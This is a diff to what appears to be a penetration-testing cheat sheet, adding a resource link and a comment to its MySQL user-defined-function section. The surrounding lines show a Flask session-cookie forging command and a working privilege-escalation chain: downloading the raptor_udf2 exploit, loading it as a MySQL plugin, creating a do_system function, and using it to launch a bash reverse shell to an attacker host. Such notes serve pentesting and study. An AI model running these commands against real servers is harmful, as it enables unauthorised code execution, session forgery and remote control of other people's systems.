@@ -530,6 +530,8 @@ flask-unsign --sign --cookie "{'logged_in': True, 'username': '<username>'}" --s
 
 MySQL UDF
 
+[resources](https://redteamnation.com/mysql-user-defined-functions/)
+
 ```shell
 # attacker pc 
 wget http://0xdeadbeef.info/exploits/raptor_udf2.c
@@ -552,5 +554,6 @@ select * from foo into dumpfile "<plugin folder path>/raptor_udf2.so";
 create function do_system returns integer soname 'raptor_udf2.so';
 # check loading
 select * from mysql.func;
+# chagne reverse shell command
 select do_system('echo ''/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh');
 ```
